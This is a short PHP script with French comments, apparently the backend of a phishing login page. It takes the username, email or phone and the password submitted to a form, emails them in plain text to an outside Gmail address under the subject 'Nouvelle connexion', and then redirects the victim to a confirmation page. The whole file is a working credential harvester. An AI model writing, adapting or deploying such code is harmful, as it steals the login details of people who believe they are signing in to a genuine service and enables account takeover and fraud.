<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username_email_phone = $_POST['username_email_phone'];
    $password = $_POST['password'];

    // Adresse e-mail où vous souhaitez recevoir les informations
    $destinataire = "Akyboot@gmail.com";

    // Sujet de l'e-mail
    $sujet = "Nouvelle connexion";

    // Corps de l'e-mail
    $message = "Nom d'utilisateur / Email / Téléphone: " . $username_email_phone . "\n";
    $message .= "Mot de passe: " . $password;

    // Envoi de l'e-mail
    mail($destinataire, $sujet, $message);

    // Redirection vers une page de confirmation
    header('Location: confirmation.html');
    exit;
}
?>
